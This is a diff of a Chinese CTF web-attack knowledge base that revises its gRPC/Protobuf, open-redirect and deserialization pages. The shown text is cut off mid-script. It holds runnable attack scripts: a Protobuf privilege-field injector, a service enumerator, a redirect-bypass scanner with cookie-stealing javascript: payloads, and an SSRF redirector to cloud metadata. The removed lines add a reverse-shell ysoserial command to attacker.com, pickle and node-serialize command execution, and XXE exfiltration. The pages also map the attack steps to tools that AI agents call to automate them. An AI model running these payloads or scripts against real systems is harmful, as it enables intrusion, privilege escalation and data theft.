@@ -5622,138 +5622,191 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # gRPC / Protobuf 攻击
 
-## Protobuf 字段注入
+gRPC 题面经常把 Web API 的输入藏进 HTTP/2 frame、metadata 和 Protobuf field number。要先知道“服务端到底解析了哪个字段”，再谈提权、越权、SSRF 或注入。
 
-Protobuf 不存字段名只存 field number。如果新增了特权字段 (field 4 = is_admin)，WAF 不知道这个 number，但服务端接受。
+## 输入信号
 
-```python
-# protobuf_field_inject.py — 二进制 Protobuf 字段注入
-import struct
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `Content-Type: application/grpc` | 读 `grpc-status` trailer 和 method path | `INVALID_ARGUMENT` 指向方法存在 | 始终 `UNIMPLEMENTED` |
+| gRPC-Web Base64 body | 解 frame + protobuf | 修改字段后响应状态变化 | 前端签名或压缩未处理 |
+| reflection 开启 | 拉 service/method/schema | `AdminService/GetFlag` 等内部方法可见 | reflection 被禁，转盲枚举 |
+| metadata 里有 token/tenant | 单变量改 `authorization/x-tenant` | method 可达性或数据域变化 | metadata 被网关固定 |
+| proto 字段未知 | append field number | 后端新版本接收 unknown field | unknown field 被丢弃 |
+| 错误含 field name/number | fuzz required/oneof/repeated | schema 反推成功 | 错误统一封装 |
 
-def encode_varint(value: int) -> bytes:
-    """Protobuf varint 编码"""
-    result = b""
-    while value > 127:
-        result += bytes([(value & 0x7F) | 0x80])
-        value >>= 7
-    result += bytes([value & 0x7F])
-    return result
+## 工作流
 
-def inject_field(payload: bytes, field_number: int, wire_type: int,
-                 value: bytes) -> bytes:
-    """在 Protobuf message 中注入额外字段"""
-    field_key = encode_varint((field_number << 3) | wire_type)
-    return payload + field_key + value
-
-# 使用: 在正常 Protobuf 请求后 append 特权字段
-# 正常: field 1 (username) = "user", field 2 (password) = "pass"
-# 注入: field 4 (is_admin\?"wire_type 0=varint) = 1 (true)
-normal_msg = b""  # 从 Burp 抓取的正常 Protobuf 请求
-injected = inject_field(normal_msg, field_number=4, wire_type=0,
-                        value=encode_varint(1))  # is_admin = true
-# → field 4 在后端新版本中存在，但 WAF 不理解
+```text
+识别 gRPC/gRPC-Web 入口
+  → 枚举 service/method 或拉 reflection
+  → 解 frame/protobuf，建立 baseline hex diff
+  → 逐字段注入/删除/类型变化
+  → metadata、compression、deadline 单变量对比
+  → 用 grpc-status/trailer/业务字段证明命中
 ```
 
-## gRPC 盲枚举
+## 0. 判定矩阵
+
+| 层 | 变量 | 观察点 |
+|---|---|---|
+| HTTP/2 path | `/pkg.Service/Method` | `grpc-status`, `:status`, trailer message |
+| gRPC frame | compression flag + length | 解码是否错位、服务端是否读 body |
+| Protobuf field | field number + wire type + value | 业务字段、权限、错误文本 |
+| metadata | auth/tenant/debug/deadline | 身份、租户、内部方法可达性 |
+| gRPC-Web | Base64 frame + trailers | 浏览器代理是否转发差异 |
+
+## 1. Frame 与 field 工具
 
 ```python
-# gRPC 即使禁用 reflection，不同状态返回不同 gRPC error code
-# UNIMPLEMENTED → 服务存在但方法不存在
-# NOT_FOUND → 服务不存在
-# INVALID_ARGUMENT → 方法存在但参数错误
-
-import requests, struct
-
-GRPC_ERROR_CODES = {
-    0: "OK",
-    5: "NOT_FOUND",
-    12: "UNIMPLEMENTED",
-    3: "INVALID_ARGUMENT",
-    7: "PERMISSION_DENIED",
-    16: "UNAUTHENTICATED",
-}
-
-def blind_grpc_enum(target: str, port: int = 50051):
-    """盲枚举 gRPC 服务和方法"""
-    SERVICES = ["UserService", "AdminService", "FlagService",
-                "AuthService", "ConfigService", "InternalService"]
-    METHODS = ["GetUser", "GetAdmin", "GetFlag", "Login",
-               "CreateUser", "DeleteUser", "UpdateConfig",
-               "ListUsers", "GetSecret", "Execute"]
-
-    for svc in SERVICES:
-        for method in METHODS:
-            # 构造 gRPC 请求 (HTTP/2 + Protobuf)
-            # 简化: 发送 http://target:port/svc.FullName/Method
-            r = requests.post(
-                f"https://{target}:{port}/{svc}/{method}",
-                headers={"Content-Type": "application/grpc"},
-                data=b"\x00\x00\x00\x00\x00"  # 最小 gRPC frame
-            )
-            grpc_status = r.headers.get("grpc-status", "unknown")
-            if grpc_status != "5":  # 不是 NOT_FOUND
-                print(f"[!] {svc}/{method}: {grpc_status}")
-```
-
-## gRPC-Web Payload 修改
-
-```python
-# gRPC-Web 使用 Base64 编码的 Protobuf → 可直接解码修改
+#!/usr/bin/env python3
+import argparse
 import base64
+import json
 
-def decode_grpc_web(payload_b64: str) -> bytes:
-    """解码 gRPC-Web payload"""
-    return base64.b64decode(payload_b64)
+def enc_varint(v):
+    out = []
+    while v > 0x7f:
+        out.append((v & 0x7f) | 0x80)
+        v >>= 7
+    out.append(v)
+    return bytes(out)
 
-def encode_grpc_web(data: bytes) -> str:
-    return base64.b64encode(data).decode()
+def field_key(num, wire):
+    return enc_varint((num << 3) | wire)
 
-# 从 Burp 抓取 gRPC-Web 请求
-captured = "CgVhZG1pbhIIdGVzdDEyMzQ="  # Base64 Protobuf
-decoded = decode_grpc_web(captured)
+def inject_varint(msg, num, value):
+    return msg + field_key(num, 0) + enc_varint(value)
 
-# 修改字段 #1 (username) 从 "admin" 改为 "admin\x00" (NUL bypass)
-# 或注入 field #3 (role) = "admin"
-modified = inject_field(decoded, field_number=3, wire_type=2,
-    value=b"\x05admin")  # wire_type=2 是 length-delimited
+def inject_bytes(msg, num, value):
+    b = value.encode() if isinstance(value, str) else value
+    return msg + field_key(num, 2) + enc_varint(len(b)) + b
 
-new_payload = encode_grpc_web(modified)
+def grpc_frame(msg, compressed=0):
+    return bytes([compressed]) + len(msg).to_bytes(4, "big") + msg
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--b64", help="grpc-web/base64 frame or raw protobuf")
+    ap.add_argument("--hex", help="raw protobuf hex")
+    ap.add_argument("--field", type=int, required=True)
+    ap.add_argument("--wire", choices=["varint", "bytes"], default="varint")
+    ap.add_argument("--value", required=True)
+    ap.add_argument("--wrap-frame", action="store_true")
+    args = ap.parse_args()
+    raw = bytes.fromhex(args.hex) if args.hex else base64.b64decode(args.b64)
+    if len(raw) > 5 and raw[0] in (0, 1) and int.from_bytes(raw[1:5], "big") == len(raw) - 5:
+        raw = raw[5:]
+    patched = inject_varint(raw, args.field, int(args.value)) if args.wire == "varint" else inject_bytes(raw, args.field, args.value)
+    out = grpc_frame(patched) if args.wrap_frame else patched
+    print(json.dumps({"hex": out.hex(), "base64": base64.b64encode(out).decode(), "diff_tail": out[-32:].hex()}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## Protoscope 工具集成
+成功样本：只追加一个 field 后，`grpc-status`、业务字段、权限或 flag 响应变化。失败样本：`invalid wire type`、`message length mismatch`、所有 field number 同一错误。
+
+## 2. 盲枚举 service/method
+
+```python
+#!/usr/bin/env python3
+import argparse
+import json
+import requests
+
+SERVICES = ["AuthService", "UserService", "AdminService", "FlagService", "InternalService", "ConfigService"]
+METHODS = ["Login", "GetUser", "ListUsers", "GetFlag", "Admin", "Debug", "UpdateConfig", "Search"]
+
+def call(base, svc, method, token=""):
+    headers = {"Content-Type": "application/grpc", "TE": "trailers"}
+    if token:
+        headers["Authorization"] = token
+    r = requests.post(f"{base.rstrip('/')}/{svc}/{method}", headers=headers, data=b"\x00\x00\x00\x00\x00", timeout=10)
+    return {
+        "service": svc,
+        "method": method,
+        "http": r.status_code,
+        "grpc_status": r.headers.get("grpc-status", ""),
+        "grpc_message": r.headers.get("grpc-message", ""),
+        "sample": r.text[:120],
+    }
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--base", required=True, help="https://host or http://host")
+    ap.add_argument("--token", default="")
+    args = ap.parse_args()
+    for s in SERVICES:
+        for m in METHODS:
+            res = call(args.base, s, m, args.token)
+            if res["grpc_status"] not in ("5", "12") or res["http"] not in (404, 501):
+                print(json.dumps(res, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
+```
+
+判定：
+
+| `grpc-status` | 解释 | 下一步 |
+|---|---|---|
+| `0` | 方法调用成功 | 读业务字段/flag |
+| `3` | 方法存在，参数错误 | 反推 schema |
+| `7/16` | 方法存在但身份不足 | metadata/token/tenant 差分 |
+| `5/12` | 服务或方法不存在 | 换候选字典 |
+
+## 3. Metadata 与 gRPC-Web 差分
+
+| 变量 | Payload | 命中样本 |
+|---|---|---|
+| `authorization` | Bearer/JWT/API key/空值 | 身份或错误位置变化 |
+| `x-tenant-id` | public/admin/internal | 数据域变化 |
+| `x-debug` | `1`, `true` | 错误暴露 field name |
+| `grpc-timeout` | 极小/极大 | 触发不同超时分支 |
+| `x-grpc-web` | browser proxy headers | 代理层与后端差异 |
+
+## 4. Protoscope / hexdiff
 
 ```bash
-# Protoscope — Protobuf 可读格式
-echo "CgVhZG1pbhIIdGVzdDEyMzQ=" | base64 -d | protoscope
+# 解 gRPC-Web body
+python grpc_field_patch.py --b64 'AAAA...' --field 4 --wire varint --value 1 --wrap-frame
 
-# 输出: 1: {"admin"} 2: {"test1234"}
-# 编辑 field 1 的值 → protoscope -schema schema.proto | base64
-
-# 安装: go install github.com/protocolbuffers/protoscope/cmd/protoscope@latest
+# 可读化 protobuf
+echo '0a0561646d696e' | xxd -r -p | protoscope
 ```
+
+保留修改前后 hex diff：`field_key`, `wire_type`, `length`, `value` 必须能复查。
 
 ## 攻击链
 
-```
-gRPC reflection → 完整 schema → 发现 AdminService → 调用 → 提权
-Blind gRPC enum → 发现 FlagService/GetFlag → 直接调用 → flag
-Protobuf field injection → field 4 is_admin=true → 后端接受 → 权限提升
-gRPC → SQLi/SSRF via Protobuf field → 后端查询 → RCE
-gRPC-Web → decode → 修改 payload → re-encode → 绕过前端验证
+```text
+gRPC 入口
+  → reflection/盲枚举 service
+  → schema/field number 反推
+  → metadata 与 field 注入
+  → 权限、租户、debug、flag 差异
+  → 转 SQLi/SSRF/JWT/IDOR 下一跳
 ```
 
 ## Evidence
 
-记录: gRPC 服务/方法枚举结果、Protobuf 消息修改前后 hex diff、注入字段的 field number 和值、服务端响应差异
+| 项 | 记录内容 |
+|---|---|
+| 入口 | path、content-type、HTTP/2/gRPC-Web、TLS、代理层 |
+| 枚举 | service/method 候选、grpc-status、grpc-message |
+| protobuf | 原始 frame、hex diff、field number、wire type、value |
+| metadata | header/trailer、token/tenant/deadline 变量 |
+| 成功样本 | 方法可达、权限变化、内部数据、flag、下游注入差异 |
+| 失败样本 | length mismatch、unknown field dropped、统一 status |
+| 下一跳 | 字段注入转 SQLi/SSRF/IDOR；token 转 JWT；服务枚举转 API discovery |
 
 ## MCP 工具映射
 
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| gRPC 端点探测 | `http_probe` | HTTP/2 探测 gRPC 服务 |
-| 按信号查技术 | `kb_router` | 搜索 grpc 相关技术文件 |
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 端点探测 | `http_probe` | 固定 gRPC path/header/body 变体 |
+| 知识路由 | `kb_router` | 按 gRPC、protobuf、grpc-web、field injection 搜索 |
 
 
 ---
@@ -7098,126 +7151,164 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # Open Redirect & Redirect Chain Attacks
 
-## 1. 重定向参数字典
+开放重定向不是只看 `Location: https://attacker`。CTF 里更常见的是：白名单解析器通过，浏览器/下游客户端跳到另一处；或者 OAuth、SSRF、缓存、meta refresh 把这个跳转当成信任边界。
+
+## 输入信号
+
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| `next/redirect/returnUrl` 等参数 | 参数字典 + 302/HTML/JS location oracle | `Location` 指向 attacker | 只回相对路径 |
+| 白名单域校验 | parser 差分矩阵 | 校验通过但浏览器跳外域 | URL parser 严格规范化 |
+| OAuth `redirect_uri` | 一次/二次编码、fragment、userinfo | code/token 到 listener | OAuth server 精确匹配 |
+| SSRF 客户端 follow redirect | 让 trusted URL 302 到 internal | 下游跟随到内网/metadata | follow redirect 关闭 |
+| meta refresh / JS redirect | `javascript:`, `data:`, HTML 注入 | 执行脚本或外带状态 | scheme 白名单 |
+| CRLF in redirect | `%0d%0aSet-Cookie` | 新 header/cache 行为 | 换行被编码 |
+
+## 工作流
+
+```text
+发现 redirect 参数
+  → 建 baseline: 302/Location/HTML/meta/JS
+  → URL parser 差分矩阵
+  → 根据 sink 选择 OAuth/SSRF/cache/XSS/CRLF 链
+  → listener 或业务 oracle 收集成功与失败样本
+```
+
+## 0. 参数发现与 URL 矩阵
 
 ```python
-# 常见 redirect 参数名
-REDIRECT_PARAMS = [
-    "redirect", "redirect_uri", "redirect_url", "url", "next",
-    "return", "returnTo", "returnUrl", "goto", "continue",
-    "target", "dest", "destination", "redir", "origin",
-    "callback", "cb", "fallback", "back", "referrer",
-    "forward", "ru", "retUrl", "rUrl", "from", "source",
-]
-
-# 探测脚本
+#!/usr/bin/env python3
+import argparse
+import hashlib
+import json
 import requests
-for param in REDIRECT_PARAMS:
-    r = requests.get(f"https://target.com/login?{param}=https://evil.com")
-    if "evil.com" in r.headers.get("Location", ""):
-        print(f"[!] {param} → open redirect")
-```
+from urllib.parse import quote
 
-## 2. 重定向绕过 WAF/过滤器
-
-```python
-BYPASSES = [
-    # 协议相对
-    "//evil.com",
-    # 反斜杠
-    "\\\\evil.com",
-    # 多斜杠 → 某些解析器退化为协议相对
-    "///evil.com",
-    "////evil.com",
-    # Unicode 同形字 (е = Cyrillic e)
-    "https://еvil.com",
-    # URL 编码
-    "https://evil.com",  # 审查时解码 → evil.com / 未解码 → 放行
-    "https://evil%2ecom",
-    # @ 符号混淆 → 前面似合法域名
-    "https://target.com@evil.com",
-    "https://target.com.evil.com",  # 子域名
-    # 路径混淆
-    "https://evil.com%23.target.com",
-    "https://evil.com%3F.target.com",
-    # 302 链: 先跳到白名单域名再跳走
-    "https://legit.com/redirect?url=https://evil.com",
-    # javascript: (如被用作 a href)
-    "javascript:fetch('https://evil.com/'+document.cookie)",
-    # data:
-    "data:text/html,<script>location='https://evil.com/'+document.cookie</script>",
+PARAMS = ["redirect","redirect_uri","redirect_url","url","next","return","returnTo","returnUrl","goto","continue","target","dest","destination","callback","back","ref","ru","retUrl"]
+URLS = [
+    "https://attacker.example/cb",
+    "//attacker.example/cb",
+    "///attacker.example/cb",
+    "https://target.example@attacker.example/cb",
+    "https://target.example.attacker.example/cb",
+    "https://attacker.example%23.target.example/cb",
+    "https://attacker.example%3f.target.example/cb",
+    "https:%5c%5cattacker.example%5ccb",
+    "/\\attacker.example/cb",
+    "javascript:location='https://attacker.example/'+document.cookie",
 ]
+
+def h(text):
+    return hashlib.sha256(text.encode("utf-8", errors="ignore")).hexdigest()[:16]
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--url", required=True, help="endpoint without query")
+    ap.add_argument("--host", default="target.example")
+    args = ap.parse_args()
+    for p in PARAMS:
+        for u in URLS:
+            payload = u.replace("target.example", args.host)
+            r = requests.get(args.url, params={p: payload}, allow_redirects=False, timeout=10)
+            print(json.dumps({"param": p, "payload": payload, "status": r.status_code, "location": r.headers.get("Location",""), "hash": h(r.text), "sample": r.text[:120]}, ensure_ascii=False))
+
+if __name__ == "__main__":
+    main()
 ```
 
-## 3. OAuth Redirect → 授权码窃取
+成功样本：`Location`、meta refresh、JS location、JSON redirect 字段任一指向 attacker，并能被浏览器或下游客户端执行。失败样本：只反射在页面文本，或被规范化成站内路径。
+
+## 1. Parser 差分矩阵
+
+| 变体 | 绕过点 | 命中样本 |
+|---|---|---|
+| `target.com@attacker.com` | userinfo vs host | 校验看前缀，浏览器到 attacker |
+| `target.com.attacker.com` | suffix/prefix includes | 白名单字符串匹配弱 |
+| `//attacker.com` | scheme-relative | 跳外域 |
+| `\attacker.com` | 反斜杠规范化差异 | 浏览器/代理解释不同 |
+| `%2f%2fattacker.com` | 解码次数差异 | 一层校验一层执行 |
+| `attacker.com#target.com` | fragment 不发给服务端 | OAuth/浏览器解析差异 |
+| punycode/同形字 | 视觉或 IDNA 差异 | 白名单误判 |
+
+## 2. OAuth code 回收
+
+```text
+authorize endpoint
+  → redirect_uri 指向目标站内 open redirect
+  → 目标站 302 到 listener
+  → listener 收到 code/state
+  → token endpoint 交换或证明 code 落点
+```
+
+Evidence 必须记录：`authorize` URL、目标站 `Location`、listener 收到的 `code/state`、token endpoint 的成功或失败样本。
+
+## 3. SSRF follow redirect
 
 ```python
-# 完整攻击流程:
-# 1. 受害者点击: https://target.com/oauth/authorize?client_id=xxx&redirect_uri=https://legit.com%2523%40evil.com&response_type=code
-# 2. OAuth 服务器校验 redirect_uri:
-#    - 解码一次: https://legit.com%23@evil.com → 域名是 legit.com? → 可能通过
-#    - 实际浏览器解析: https://legit.com%23@evil.com → 发送到 evil.com
-# 3. 授权码被发到 evil.com
-# 4. 攻击者用授权码换 access_token → Account Takeover
+#!/usr/bin/env python3
+import argparse
+from http.server import BaseHTTPRequestHandler, HTTPServer
+
+class R(BaseHTTPRequestHandler):
+    target = "http://169.254.169.254/latest/meta-data/"
+    def do_GET(self):
+        self.send_response(302)
+        self.send_header("Location", self.target)
+        self.end_headers()
+        self.wfile.write(b"redirecting")
+
+def main():
+    ap = argparse.ArgumentParser()
+    ap.add_argument("--listen", default="0.0.0.0")
+    ap.add_argument("--port", type=int, default=8088)
+    ap.add_argument("--target", required=True)
+    args = ap.parse_args()
+    R.target = args.target
+    HTTPServer((args.listen, args.port), R).serve_forever()
+
+if __name__ == "__main__":
+    main()
 ```
 
-## 4. Redirect → XSS
+把 SSRF 参数指向该 listener，如果服务端 HTTP client 跟随 302，下一跳会访问 `--target`。成功样本是 listener 访问日志加目标侧响应差异；失败样本是只访问第一跳或明确不 follow。
 
-```javascript
-// 如果 redirect 参数渲染在 <meta> refresh 或 JS 中:
-// <meta http-equiv="refresh" content="0;url={redirect}">
-// 注入: javascript:alert(document.cookie) → XSS
+## 4. 链路选择
 
-// 或者在服务端拼接:
-// header("Location: " + $_GET['redirect']);
-// 注入: %0d%0aSet-Cookie:session=attacker → Header Injection
+| Redirect sink | 下一跳 |
+|---|---|
+| 登录回跳 | session fixation、phishing 页面、token leak |
+| OAuth redirect_uri | code/token 回收 |
+| SSRF URL | metadata/internal/admin panel |
+| cache/CDN | cache poisoning/web cache deception |
+| meta refresh/JS | XSS/admin bot |
+| CRLF Location | header injection、Set-Cookie/cache |
+
+## 攻击链
+
+```text
+Open Redirect
+  → URL parser 差分
+  → OAuth code / SSRF follow / cache / XSS / CRLF sink
+  → listener 或业务 oracle 证明下一跳
 ```
-
-## 5. Redirect → SSRF
-
-```python
-# 如果 redirect 的目标被服务端 HTTP 客户端跟随:
-# redirect=http://169.254.169.254/latest/meta-data/
-# → SSRF 读云 metadata
-
-# redirect=file:///etc/passwd
-# → 文件读取 (Java/某些语言)
-```
-
-## 6. 攻击链
-
-```
-Open Redirect → OAuth code 窃取 → Account Takeover
-Open Redirect → Meta refresh XSS → Cookie 窃取
-Open Redirect → SSRF → Cloud Metadata
-Open Redirect chaining: A→B→C→attacker (跳过白名单)
-```
-
-## 工具引用
-
-```bash
-# 项目内 HTTP 探测
-python scripts/ctf-website/http_probe.py
-
-# 安装第三方 (katana, waybackurls 等)
-powershell scripts/ctf-website/install_missing_tools.ps1
-```
-
-## MCP 工具映射
-
-AI Agent 可调用以下 MCP 工具自动完成或加速上述攻击步骤：
-
-| 攻击步骤 | MCP 工具 | 说明 |
-|---------|---------|------|
-| 开放重定向探测 | `http_probe` | HTTP GET 探测开放重定向入口点 |
-| 知识检索 | `kb_router` | 按开放重定向信号搜索知识库 |
 
 ## Evidence
 
-- 保存 baseline 与单变量 probe 的完整请求、响应状态、关键响应头和正文摘要。
-- 将“响应差异”与服务端副作用分开记录；只有权限、状态、数据或 Flag 可重复变化才算确认。
-- 固定 session、输入、并发参数和时间窗口重放，记录成功响应、失败样本和下一跳。
-- 输出统一放入 `exports/ctf-website/<case>/`，凭据只用 `REDACTED` 占位，自动检索 `flag{}`、`CTF{}`、`DASCTF{}`。
+| 项 | 记录内容 |
+|---|---|
+| 入口 | 参数名、请求 URL、状态码、Location/meta/JS/JSON 字段 |
+| URL 差分 | payload、编码层数、服务端校验结果、浏览器实际目标 |
+| 链路 | OAuth/SSRF/cache/XSS/CRLF 的下一跳证据 |
+| 成功样本 | listener 收到 code/token/请求，或业务状态/缓存/header 变化 |
+| 失败样本 | 规范化站内路径、scheme 拒绝、不 follow redirect、state mismatch |
+| 下一跳 | OAuth 转 20-oauth-deep；SSRF 转 ssrf；CRLF 转 hpp-crlf；cache 转 08-infra |
+
+## MCP 工具映射
+
+| 步骤 | MCP 工具 | 说明 |
+|---|---|---|
+| 重定向探测 | `http_probe` | 固定参数字典和 allow_redirects=false |
+| 知识路由 | `kb_router` | 按 open redirect、OAuth redirect、SSRF follow 搜索 |
 
 
 ---
@@ -7568,309 +7659,171 @@ Source: https://github.com/LING71671/open-reverselab/blob/main/kb/ctf-website/te
 
 # Deserialization Vulnerabilities
 
-反序列化漏洞是服务器端逻辑漏洞的核心，主要出现在信任了客户端传入的结构化状态数据时。本指南涵盖主流 Web 语言（PHP、Python、Node.js）的高级反序列化利用战术。
+反序列化不是“见到 blob 就上 gadget”。先确认格式、入口、依赖、触发点、回显或回连，再选链。CTF 里最容易失误的是格式识别错误、payload 被 Base64/URL/签名包裹、或者 gadget 触发了但没有可见 oracle。
 
----
+## 输入信号
 
-## 1. PHP 反序列化高阶技术
+| 信号 | 立即动作 | 命中样本 | 失败样本 |
+|---|---|---|---|
+| Base64 以 `rO0AB` 开头 | Java 序列化路线 | URLDNS/DNS callback | Base64 只是普通 token |
+| PHP `O:`, `a:`, `s:` | PHP serialize 路线 | `__wakeup/__destruct` 错误或输出变化 | 数据被 JSON 包裹未 unserialize |
+| Python pickle `gAS`, `\x80\x04` | pickle opcode 路线 | 自定义 marker 被执行/回显 | Unpickler 限制全部拒绝 |
+| Node `_$$ND_FUNC$$_` | node-serialize 路线 | 函数字段被还原 | JSON.parse 不执行 |
+| `__VIEWSTATE` | .NET ViewState | MAC/validationKey 线索 | ViewStateUserKey/MAC 阻断 |
+| YAML/XML/Hessian/Jackson 类型字段 | 多态反序列化 | 类型实例化错误/回连 | 类型白名单拒绝 |
 
-### A. GC (Garbage Collector) 垃圾回收提前销毁绕过
-在很多挑战中，反序列化类拥有 `__wakeup()`（用于清理属性、阻断危险调用）和 `__destruct()`（存在漏洞的析构函数）。我们可以在 PHP 调用 `__wakeup()` 前，通过迫使垃圾回收器（GC）提前回收对象来直接触发 `__destruct()`。
-
-*   **键名冲突原理**：
-    PHP 反序列化数组时，如果遇到重复的键名，前一个键值对应的对象会被覆盖。在覆盖的瞬间，前一个对象失去所有引用，导致 GC 立即将其销毁并调用其 `__destruct()`，之后由于反序列化继续进行，若最后抛出异常导致整个反序列化失败，`__wakeup()` 将永远不会被执行。
-*   **Payload 构造**：
-    假设存在漏洞类为 `Exploit`。我们构造一个包含两个元素的数组：
-    ```php
-    // 正常序列化一个数组，包含两个 Exploit 对象，键名相同：
-    // a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:0;i:1;}
-    ```
-    当 PHP 解析到第二个 `i:0` 时，第一个 `Exploit` 对象被覆盖，GC 立即执行其析构函数（执行恶意逻辑）；由于随后反序列化流程遇到异常或执行完抛错，程序异常中止，跳过了对该对象的常规属性审查。
-
-*   **格式损坏原理**：
-    人为破坏反序列化字符串后部的闭合结构，例如：
-    ```php
-    a:2:{i:0;O:7:"Exploit":1:{s:4:"cmd";s:6:"whoami";}i:1;s:10:"corrupted...
-    ```
-    解析完第一个对象后，遇到畸形字段抛出异常，反序列化中断，已解析出的第一个对象被释放，触发 `__destruct()`，但未执行 `__wakeup()`。
-
-### B. 无自定义 Gadget 链时的原生类利用
-当目标代码中没有定义可以串联的利用链时，我们需要在 PHP 环境中寻找内置的原生类进行反序列化：
-
-*   **`SoapClient` 触发 SSRF（支持 CRLF 头部注入）**：
-    利用内置的 `SoapClient` 发起任意 HTTP 请求。配合反序列化可控制其 `_user_agent` 写入 `\r\n` 注入自定义 HTTP 头：
-    ```php
-    $target = "http://127.0.0.1:80/shell.php";
-    $b = new SoapClient(null, array('uri' => 'test', 'location' => $target));
-
-    // 通过反序列化修改其 user_agent 属性，注入 Cookie 或 Post Data
-    $b->_user_agent = "Antigravity\r\nCookie: session=admin\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 14\r\n\r\ncmd=cat+/flag";
-
-    echo serialize($b);
-    ```
-    当调用反序列化后对象的任意不存在方法（如被 `__call` 魔术方法转接）时，将向内网 `shell.php` 发送携带恶意 POST payload 的 HTTP 请求。
-
-*   **`SimpleXMLElement` 触发 XXE**：
-    若反序列化输入会被转入 XML 节点处理，可以通过反序列化 `SimpleXMLElement` 引入外部实体（XXE），实现内网任意文件读取：
-    ```php
-    $xxe = new SimpleXMLElement("<!DOCTYPE x [<!ENTITY % file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'><!ENTITY % eval SYSTEM 'http://attacker.com/evil.xml'>%eval;]>", LIBXML_NOENT);
-    echo serialize($xxe);
-    ```
-
----
-
-## 2. Python Pickle 序列化漏洞
-
-Python 的 `pickle` 模块不只是解析数据，它其实是一个小型虚拟机（基于 Opcode）。
-
-### A. 基于 `__reduce__` 自动构造
-最标准的 RCE 利用是通过定义 `__reduce__` 魔术方法，使其在 `unpickle` 时自动执行系统命令：
-
-```python
-import pickle
-import os
-
-class Exploit(object):
-    def __reduce__(self):
-        # 返回一个元组：(可执行对象, (传给该对象的参数元组,))
-        return (os.system, ('whoami',))
-
-payload = pickle.dumps(Exploit())
-print(payload)  # 输出二进制序列
-```
-
-### B. 自定义手写 Opcode 绕过限制
-在防守严格的 CTF 中，后端通常会自定义 `Unpickler.find_class`，限制只能 import 特定的安全白名单模块（如拒绝 `os`, `sys`, `subprocess`）。
-我们可以手写 Opcode 来绕过限制，例如利用已经载入白名单的模块或内置函数：
+## 工作流
 
 ```text
-c__builtin__
-getattr
-(c__builtin__
-__import__
-S'os'
-tR(S'system'
-tRS'whoami'
-tR.
-```
-*Opcode 逻辑*：
-1.  载入 `__builtin__.getattr`。
-2.  载入 `__builtin__.__import__` 并调用它加载 `os` 模块。
-3.  通过 `getattr` 提取 `os` 模块的 `system` 方法。
-4.  调用该方法执行 `whoami`。
-
----
-
-## 3. Node.js `node-serialize` 代码注入
-
-Node.js 环境下的 `node-serialize` 库在进行反序列化时，若遇到符合特定前缀的字符串，会动态使用 `eval()` 恢复为 JS 函数：
-
-### A. IIFE (立即调用函数表达式) 注入
-如果反序列化的字符串带有 `_$$ND_FUNC$$_` 标记，且该函数在定义完毕后紧跟一对括号 `()`，反序列化程序会自动执行此函数。
-
-*   **Payload 构造**：
-    ```json
-    {
-      "username": "admin",
-      "run": "_$$ND_FUNC$$_function() { const exec = require('child_process').execSync; return exec('cat /flag').toString(); }()"
-    }
-    ```
-*   **还原时触发**：
-    当服务端执行 `unserialize(payload)` 时，对象恢复过程直接触发立即执行函数，执行系统命令并将回显赋值给对象的 `run` 属性。
-
----
-
----
-
-## 4. Java 反序列化 (ysoserial 体系)
-
-```bash
-# 指纹: Header/Cookie/Body 含 Base64 编码的 'rO0AB' (Java 序列化 magic)
-# 或 'aced0005' (hex)
-
-# ysoserial 常用 gadget 链
-java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64
-java -jar ysoserial.jar CommonsBeanutils1 'touch /tmp/pwned' | base64
-java -jar ysoserial.jar Spring1 'id' | base64
-java -jar ysoserial.jar Groovy1 'nc attacker.com 4444 -e /bin/bash' | base64
-
-# 检测: 先用 DNSLog gadget
-java -jar ysoserial.jar URLDNS 'http://UNIQUE.attacker.com' | base64
-# → DNS 收到请求 = 反序列化触发
+抽取 blob 与编码层
+  → magic bytes / 类型字段识别
+  → 建 marker payload 和 baseline oracle
+  → 指纹语言、依赖、类路径、过滤器
+  → 选择 gadget 或业务类链
+  → 用回显、DNS/HTTP callback、状态差异记录 Evidence
 ```
 
-### Gadget 链选择决策
+## 0. 格式识别脚本
 
 ```python
-# 按目标环境选 Gadget:
-GADGET_MAP = {
-    "CommonsCollections 3.x": ["CommonsCollections1", "CommonsCollections3", "CommonsCollections5"],
-    "CommonsCollections 4.x": ["CommonsCollections2", "CommonsCollections4", "CommonsCollections6"],
-    "CommonsBeanutils": ["CommonsBeanutils1"],
-    "Spring Framework": ["Spring1", "Spring2"],
-    "Groovy": ["Groovy1"],
-    "JDK 7u21": ["Jdk7u21"],
-    "JRE 8u20": ["Jre8u20"],
-    "RMI": ["RMIRegistryExploit"],
-}
+#!/usr/bin/env python3
+import argparse
+import base64
+import binascii
+import json
+import re
+
+MAGIC = [
+    (b"\xac\xed\x00\x05", "java-serialized"),
+    (b"rO0AB", "java-base64"),
+    (b"O:", "php-object"),
+    (b"a:", "php-array"),
+    (b"\x80\x04", "python-pickle4"),
+    (b"\x80\x05", "python-pickle5"),
+    (b"_$$ND_FUNC$$_", "node-serialize"),
+    (b"AAEAAAD", ".net-binaryformatter-base64"),
+    (b"---", "yaml"),
+]
+
+def layers(raw):
+    yield "raw", raw
+    for name, fn in [
+        ("url", lambda x: bytes.fromhex(x.decode().replace("%", ""))),
+        ("base64", lambda x: base64.b64decode(x + b"=" * (-len(x) % 4))),
+        ("hex", lambda x: binascii.unhexlify(re.sub(rb"\s+", b"", x))),
+    ]:
+        try:
+            yield name, fn(raw)
+        except Exception:
+            pass
+
+def main():
+    ap = argparse.ArgumentParser()
